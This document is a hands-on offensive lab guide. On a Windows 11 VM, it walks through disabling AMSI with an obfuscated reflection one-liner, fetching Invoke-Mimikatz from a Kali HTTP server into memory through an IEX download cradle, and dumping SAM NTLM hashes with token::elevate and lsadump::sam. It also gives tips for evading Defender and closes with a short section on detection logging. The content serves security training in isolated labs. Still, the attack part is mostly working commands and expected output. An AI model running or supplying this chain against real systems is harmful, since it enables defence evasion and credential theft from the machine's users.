# Lab: AMSI Bypass and In-Memory Mimikatz Execution

## Overview

In this lab, you will bypass the Anti-Malware Scan Interface (AMSI) in a PowerShell session using a reflection-based technique, then pull `Invoke-Mimikatz.ps1` directly from a Kali HTTP server into memory without touching disk. Once loaded, you will use `Invoke-Mimikatz` to dump the local SAM database and extract NTLM hashes. By the end, you will understand how AMSI sits in the PowerShell pipeline, why bypassing it enables in-memory script execution, and how SAM credentials are extracted from a live system.

---

## Prerequisites

| Requirement | Details |
|---|---|
| OS (Target) | Windows 11 VM - Local Administrator |
| OS (Attacker) | Kali Linux on the same subnet |
| Permissions | Local Administrator on the Windows target |
| Tools (Kali) | Python 3 (pre-installed), `Invoke-Mimikatz.ps1` |
| Tools (Windows) | PowerShell 5.1+, Windows Defender real-time protection **enabled** |
| Network | Both VMs on the same host-only or internal network adapter |

> ⚠️ **Warning:** Perform this lab inside isolated virtual machines only. Dumping SAM hashes on a production or domain-joined system without authorization is illegal. Never run these steps outside a controlled lab environment.

---

## Lab Goals

- Understand what AMSI is and where it intercepts PowerShell content
- Execute a reflection-based AMSI bypass without touching disk
- Serve a malicious PowerShell script from Kali over HTTP
- Load `Invoke-Mimikatz` directly into memory using a download cradle
- Dump the local SAM database with `Invoke-Mimikatz` and interpret the output

---

## Background: What is AMSI?

AMSI (Anti-Malware Scan Interface) is a Windows API that allows applications - including PowerShell, WScript, and .NET - to submit content to the installed AV engine for inspection **before execution**. When PowerShell receives a script block, it passes the content to AMSI, which forwards it to Defender. If the content matches a signature, execution is blocked.

The bypass in this lab targets the `amsiInitFailed` field in the internal `AmsiUtils` class. Setting it to `$true` causes the AMSI provider to report initialisation failure for the current session, silently disabling all subsequent scans.

---

## Part 1: Set Up the HTTP Server on Kali

### Step 1 - Locate Invoke-Mimikatz.ps1

On your Kali host, the script is available from the PowerSploit package:

```bash
ls /Lab-Artifacts/Mimikatz/Invoke-Mimikatz.ps1
```

### Step 2 - Start the HTTP Server

```bash
cd /Lab-Artifacts/Mimikatz/
python3 -m http.server 8080
```

**Expected output:**
```
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Leave this terminal open. The server will log each incoming request so you can confirm the Windows target fetches the file.

### Step 3 - Note Your Kali IP Address

```bash
ip -4 addr show eth0 | grep inet
```

> 📝 **Note:** Replace `eth0` with your actual interface name if different (e.g. `eth1`, `ens33`). Record the IP - you will use it in the download cradle on the Windows side.

---

## Part 2: Bypass AMSI on the Windows Target

### Step 1 - Open an Elevated PowerShell Session

1. On the Windows VM, right-click the Start menu.
2. Select **Windows PowerShell (Admin)** or **Terminal (Admin)**.
3. Confirm you are running as Administrator:
   ```powershell
   whoami /priv | findstr "SeDebugPrivilege"
   ```
   `SeDebugPrivilege` should appear in the output.

### Step 2 - Confirm AMSI is Active

Attempt to invoke a known-bad string to confirm Defender/AMSI is intercepting:

```powershell
'Invoke-Mimikatz'
```

**Expected result:** Defender raises an alert or PowerShell throws:
```
This script contains malicious content and has been blocked by your antivirus software.
```

This confirms AMSI is active and scanning session content.

### Step 3 - Execute the AMSI Bypass

Run the following reflection-based bypass in the same PowerShell window:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false)
```

**What this does - line by line:**

| Component | Purpose |
|---|---|
| `[Ref].Assembly` | References the currently loaded `mscorlib` assembly via the `[Ref]` type accelerator |
| `.GetType('System.Management.Automation.Amsi'+'Utils')` | Resolves the internal `AmsiUtils` class using string concatenation to avoid AMSI scanning the class name as a literal |
| `.GetField('amsiInit'+'Failed','NonPublic,Static')` | Obtains a `FieldInfo` handle to the private static `amsiInitFailed` boolean field |
| `.SetValue($null, !$false)` | Sets the field value to `$true` (`!$false`), signalling to the AMSI provider that initialisation failed for this session |

> 📝 **Note:** The string concatenation (`'Amsi'+'Utils'`, `'amsiInit'+'Failed'`) is intentional - it prevents AMSI from matching the bypass technique as a known signature before the field is set.

### Step 4 - Verify the Bypass Worked

Repeat the test from Step 2:

```powershell
'Invoke-Mimikatz'
```

**Expected result:** PowerShell prints the string without raising an alert. AMSI is now disabled for this session.

---

## Part 3: Load Invoke-Mimikatz into Memory

### Step 1 - Construct the Download Cradle

The download cradle fetches the script content over HTTP and pipes it directly to `Invoke-Expression` (IEX), loading it into the current PowerShell session without writing anything to disk.

Replace `<KALI-IP>` with the IP address recorded in Part 1 Step 3:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<KALI-IP>:8080/Invoke-Mimikatz.ps1')
```

**Expected behaviour:**
- The PowerShell session pauses briefly while the script downloads.
- No output is printed - the script defines functions but does not execute them yet.
- On your Kali terminal you will see an HTTP log entry confirming delivery:
  ```
  192.168.x.x - - [date] "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
  ```

> 📝 **Note:** If Defender blocks the download despite the AMSI bypass, the script content is being flagged by network inspection rather than AMSI. In that case, serve the script over HTTPS or obfuscate the file on the Kali side before re-running.

### Step 2 - Confirm the Function is Loaded

```powershell
Get-Command Invoke-Mimikatz
```

**Expected output:**
```
CommandType  Name              Version  Source
-----------  ----              -------  ------
Function     Invoke-Mimikatz
```

`Invoke-Mimikatz` is now resident in memory and ready to execute.

---

## Part 4: Dump the SAM Database

### Step 1 - Elevate to SYSTEM

`lsadump::sam` requires SYSTEM-level access. `Invoke-Mimikatz` can impersonate the SYSTEM token using the `token::elevate` command before the dump:

```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```

**Flags:**

| Flag | Description |
|---|---|
| `-Command` | Passes one or more mimikatz commands as a quoted string, executed in sequence |
| `token::elevate` | Impersonates the SYSTEM token from the current Administrator session |
| `lsadump::sam` | Reads the SAM hive and SYSTEM hive to extract local account NTLM hashes |

### Step 2 - Interpret the Output

A successful dump produces output similar to:

```
mimikatz(powershell) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

mimikatz(powershell) # lsadump::sam
Domain : EVASION_WIN11
SysKey : 4a1b2c3d4e5f...

SAMKey : 9f8e7d6c...

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000001f5 (501)
User : Guest
  Hash NTLM: (null)

RID  : 000003e8 (1000)
User : labuser
  Hash NTLM: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

**What to look for:**

| Field | Meaning |
|---|---|
| `SysKey` | The SYSKEY used to encrypt the SAM - derived from the SYSTEM hive |
| `SAMKey` | The key used to encrypt individual account hashes |
| `RID` | Relative Identifier - `0x1f4` (500) is always the built-in Administrator |
| `Hash NTLM` | The NTLM hash for the account in `LM:NTLM` format |
| `aad3b435...` | The empty LM hash - indicates LM hashing is disabled (normal on modern Windows) |
| `31d6cfe0...` | The NTLM hash for an empty password |

> ⚠️ **Note:** These hashes can be used directly in Pass-the-Hash attacks or submitted to offline cracking tools such as Hashcat (`-m 1000` for NTLM). Handle them accordingly within your lab environment.

---

## Part 5: Observe the Event Log

Even with AMSI bypassed, Windows will log process and script activity. Check what was recorded:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" |
  Where-Object { $_.Id -in @(1116, 1117) } |
  Select-Object TimeCreated, Id, Message |
  Format-List
```

Also check PowerShell script block logging:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
  Where-Object { $_.Id -eq 4104 } |
  Select-Object TimeCreated, Message |
  Select-Object -First 10 |
  Format-List
```

| Event ID | Log | Description |
|---|---|---|
| **4104** | PowerShell/Operational | Script block logging - records deobfuscated content of executed script blocks |
| **4688** | Security | Process creation - logs the PowerShell process and its command line if auditing is enabled |
| **1116** | Defender/Operational | Malware detected - may fire if any on-disk artifact is created |

> 📝 **Note:** If script block logging (Event ID 4104) recorded the bypass and the download cradle in plaintext, this demonstrates that AMSI bypass does **not** defeat logging - it only defeats AV scanning. Defenders monitoring Event ID 4104 will still see the technique.

---

---

## Common Errors and Fixes

| Error | Cause | Fix |
|---|---|---|
| `Exception calling "SetValue"` | AMSI bypass ran in a non-elevated session or a constrained language mode is active | Ensure PowerShell is running as Administrator; check `$ExecutionContext.SessionState.LanguageMode` - must be `FullLanguage` |
| `Unable to connect to the remote server` | Kali HTTP server not running or wrong IP/port | Verify `python3 -m http.server 8080` is running on Kali; confirm IP with `ip a` |
| Download succeeds but `Invoke-Mimikatz` is blocked | Script content flagged by network-layer inspection after download | AMSI bypass only covers the PowerShell scan interface; serve the script obfuscated or over a localhost proxy |
| `Access is denied` on `lsadump::sam` | Session is not SYSTEM | Confirm `token::elevate` ran successfully before `lsadump::sam`; check that the shell is elevated (Administrator) |
| `Get-Command Invoke-Mimikatz` returns nothing | Download cradle failed silently | Re-run the cradle and check the Kali HTTP server log for the GET request; confirm the URL resolves |
